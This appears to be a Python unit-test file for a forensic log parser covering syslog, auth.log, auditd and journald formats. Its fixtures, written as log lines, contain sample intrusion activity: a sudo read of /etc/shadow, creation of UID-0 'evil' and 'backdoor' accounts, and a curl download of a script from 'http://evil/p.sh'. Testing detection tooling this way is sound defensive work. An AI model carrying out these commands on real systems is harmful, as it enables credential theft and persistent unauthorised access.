from __future__ import annotations

# ruff: noqa: E402
#
# Linux log parsing: syslog / auth.log (RFC3164 year inference, RFC5424, ISO
# rsyslog), auditd audit.log (record merge by audit id, EXECVE argv with hex
# args), and journald JSON export. All normalize onto the unified Event schema.

import os
import sys
import tempfile
import types
import unittest
import zipfile
from datetime import datetime, timezone
from pathlib import Path


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from app.ingest.linux import parse_syslog_line
from app.ingest.parsers import iter_zip_members, parse_file


def _write(d: str, name: str, body: str, mtime: float | None = None) -> Path:
    p = Path(d) / name
    p.write_text(body)
    if mtime is not None:
        os.utime(p, (mtime, mtime))
    return p


# 2026-07-12 06:00:00 UTC
_JUL_2026 = datetime(2026, 7, 12, 6, 0, 0, tzinfo=timezone.utc).timestamp()


class SyslogLineTests(unittest.TestCase):
    def test_rfc3164_year_inference_from_mtime(self) -> None:
        hint = datetime(2026, 7, 12, 6, 0, 0, tzinfo=timezone.utc)
        rec = parse_syslog_line("Jul 12 05:03:22 web01 sshd[2211]: hello", hint)
        self.assertEqual(rec["ts"].year, 2026)
        self.assertEqual(rec["host"], "web01")
        self.assertEqual(rec["ident"], "sshd")
        self.assertEqual(rec["pid"], "2211")

    def test_rfc3164_december_line_in_january_file_rolls_back_year(self) -> None:
        hint = datetime(2026, 1, 3, 6, 0, 0, tzinfo=timezone.utc)
        rec = parse_syslog_line("Dec 31 23:59:00 web01 cron[1]: run", hint)
        self.assertEqual(rec["ts"].year, 2025)

    def test_iso_rsyslog_line(self) -> None:
        hint = datetime(2026, 7, 12, tzinfo=timezone.utc)
        rec = parse_syslog_line(
            "2026-07-12T05:03:22.123456+00:00 web01 sshd[9]: x", hint)
        self.assertEqual(rec["ts"], datetime(2026, 7, 12, 5, 3, 22, 123456, tzinfo=timezone.utc))
        self.assertEqual(rec["ident"], "sshd")

    def test_rfc5424_line(self) -> None:
        hint = datetime(2026, 7, 12, tzinfo=timezone.utc)
        rec = parse_syslog_line(
            "<34>1 2026-07-12T05:03:22Z web01 sshd 9 - - Failed password", hint)
        self.assertEqual(rec["host"], "web01")
        self.assertEqual(rec["ident"], "sshd")
        self.assertIn("Failed password", rec["message"])


class SyslogFileClassificationTests(unittest.TestCase):
    def test_authlog_classifications(self) -> None:
        body = (
            "Jul 12 05:03:22 web01 sshd[1]: Failed password for invalid user admin from 203.0.113.5 port 22 ssh2\n"
            "Jul 12 05:04:01 web01 sshd[2]: Accepted password for root from 203.0.113.5 port 22 ssh2\n"
            "Jul 12 05:05:00 web01 sudo[3]:  bob : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
            "Jul 12 05:06:00 web01 useradd[4]: new user: name=evil, UID=0\n"
            "Jul 12 05:07:00 web01 CRON[5]: (root) CMD (backup.sh)\n"
        )
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "auth.log", body, _JUL_2026)
            events = list(parse_file(p, "auth.log"))
        cats = [e["category"] for e in events]
        self.assertEqual(cats, ["auth", "auth", "auth", "account", "process"])
        self.assertEqual(events[0]["raw"]["AuthOutcome"], "failure")
        self.assertTrue(events[0]["raw"]["InvalidUser"])
        self.assertEqual(events[1]["raw"]["AuthOutcome"], "success")
        self.assertTrue(events[1]["raw"]["RootLogin"])
        self.assertEqual(events[2]["raw"]["CommandLine"], "/bin/cat /etc/shadow")
        self.assertEqual(events[3]["raw"]["LinuxAccountAction"], "new_user")
        self.assertEqual(events[4]["raw"]["CommandLine"], "backup.sh")

    def test_all_events_have_linux_log_marker(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "syslog", "Jul 12 05:03:22 h app[1]: hi\n", _JUL_2026)
            events = list(parse_file(p, "syslog"))
        self.assertTrue(all(e["raw"].get("linux_log") for e in events))

    def test_zip_member_timestamp_drives_rfc3164_year(self) -> None:
        body = "Jul 12 05:03:22 web01 sshd[1]: Failed password for root from 203.0.113.5 port 22 ssh2\n"
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            archive = root / "logs.zip"
            info = zipfile.ZipInfo("var/log/auth.log", (2022, 7, 12, 6, 0, 0))
            with zipfile.ZipFile(archive, "w") as zf:
                zf.writestr(info, body)
            extracted = root / "extracted"
            extracted.mkdir()
            path, source = next(iter(iter_zip_members(archive, extracted)))
            event = next(parse_file(path, source))
        self.assertEqual(event["timestamp"].year, 2022)


class AuditdTests(unittest.TestCase):
    def test_records_merge_by_audit_id_and_execve_hex(self) -> None:
        # SYSCALL + EXECVE (a10 ordering, hex-encoded arg) + CWD + PATH + EOE ->
        # exactly one merged process event.
        hexarg = "2d6f2f746d702f702e7368"  # -o/tmp/p.sh
        body = (
            'type=SYSCALL msg=audit(1752300000.1:42): arch=c000003e syscall=59 '
            'success=yes exit=0 comm="curl" exe="/usr/bin/curl" key="exec_rule"\n'
            'type=EXECVE msg=audit(1752300000.1:42): argc=12 a0="curl" a1="http://evil/p.sh" '
            f'a10={hexarg} a2="-v"\n'
            'type=CWD msg=audit(1752300000.1:42): cwd="/root"\n'
            'type=PATH msg=audit(1752300000.1:42): item=0 name="/usr/bin/curl" nametype=NORMAL\n'
            'type=EOE msg=audit(1752300000.1:42):\n'
        )
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "audit.log", body)
            events = list(parse_file(p, "audit.log"))
        self.assertEqual(len(events), 1)
        e = events[0]
        self.assertEqual(e["category"], "process")
        self.assertEqual(e["raw"]["Exe"], "/usr/bin/curl")
        self.assertEqual(e["raw"]["Key"], "exec_rule")
        self.assertEqual(e["raw"]["Cwd"], "/root")
        # argv order: a0 a1 a2 a10 (numeric sort, not lexical), hex decoded
        self.assertEqual(e["raw"]["CommandLine"], "curl http://evil/p.sh -v -o/tmp/p.sh")
        self.assertEqual(e["raw"]["Paths"], [{"name": "/usr/bin/curl", "nametype": "NORMAL"}])

    def test_user_login_nested_msg_res_success(self) -> None:
        body = ("type=USER_LOGIN msg=audit(1752300050.5:900): pid=3000 uid=0 "
                "msg='op=login acct=\"root\" exe=\"/usr/sbin/sshd\" "
                "hostname=203.0.113.9 addr=203.0.113.9 res=success'\n")
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "audit.log", body)
            events = list(parse_file(p, "audit.log"))
        self.assertEqual(len(events), 1)
        e = events[0]
        self.assertEqual(e["category"], "auth")
        self.assertEqual(e["raw"]["AuthProto"], "auditd")
        self.assertEqual(e["raw"]["AuthOutcome"], "success")
        self.assertEqual(e["raw"]["AuthUser"], "root")
        self.assertEqual(e["raw"]["SrcIp"], "203.0.113.9")

    def test_add_user_record_stamps_account_action(self) -> None:
        body = ('type=ADD_USER msg=audit(1752300050.5:901): pid=3001 uid=0 '
                'msg=\'op=add-user acct="backdoor" exe="/usr/sbin/useradd" '
                'hostname=? addr=? res=success\'\n')
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "audit.log", body)
            event = next(parse_file(p, "audit.log"))
        self.assertEqual(event["raw"]["LinuxAccountAction"], "new_user")
        self.assertEqual(event["raw"]["AccountName"], "backdoor")


class JournaldTests(unittest.TestCase):
    def test_journald_jsonl(self) -> None:
        import json
        rows = [
            {"__REALTIME_TIMESTAMP": "1752300000123456", "_HOSTNAME": "web01",
             "SYSLOG_IDENTIFIER": "sshd", "_PID": "999",
             "MESSAGE": "Failed password for root from 10.0.0.9 port 22 ssh2"},
            {"__REALTIME_TIMESTAMP": "1752300010000000", "_HOSTNAME": "web01",
             "_COMM": "sudo", "_CMDLINE": "sudo -i", "_UID": "1000",
             "MESSAGE": "pam_unix(sudo:session): session opened for user root"},
        ]
        body = "\n".join(json.dumps(r) for r in rows) + "\n"
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "journal.json", body)
            events = list(parse_file(p, "journal"))
        self.assertEqual(len(events), 2)
        self.assertEqual(events[0]["category"], "auth")
        self.assertEqual(events[0]["raw"]["AuthOutcome"], "failure")
        self.assertEqual(events[0]["raw"]["SrcIp"], "10.0.0.9")
        self.assertEqual(events[0]["timestamp"],
                         datetime(2025, 7, 12, 6, 0, 0, 123456, tzinfo=timezone.utc))
        self.assertEqual(events[1]["raw"]["CommandLine"], "sudo -i")

    def test_journald_row_wins_over_syslog_source_name(self) -> None:
        import json
        row = {
            "__REALTIME_TIMESTAMP": "1752300000123456",
            "_HOSTNAME": "web01",
            "SYSLOG_IDENTIFIER": "sshd",
            "MESSAGE": "Failed password for root from 10.0.0.9 port 22 ssh2",
        }
        with tempfile.TemporaryDirectory() as d:
            p = _write(d, "syslog.jsonl", json.dumps(row) + "\n")
            event = next(parse_file(p, "syslog"))
        self.assertIsNotNone(event["timestamp"])
        self.assertEqual(event["raw"]["AuthOutcome"], "failure")
        self.assertEqual(event["raw"]["SrcIp"], "10.0.0.9")


if __name__ == "__main__":
    unittest.main()
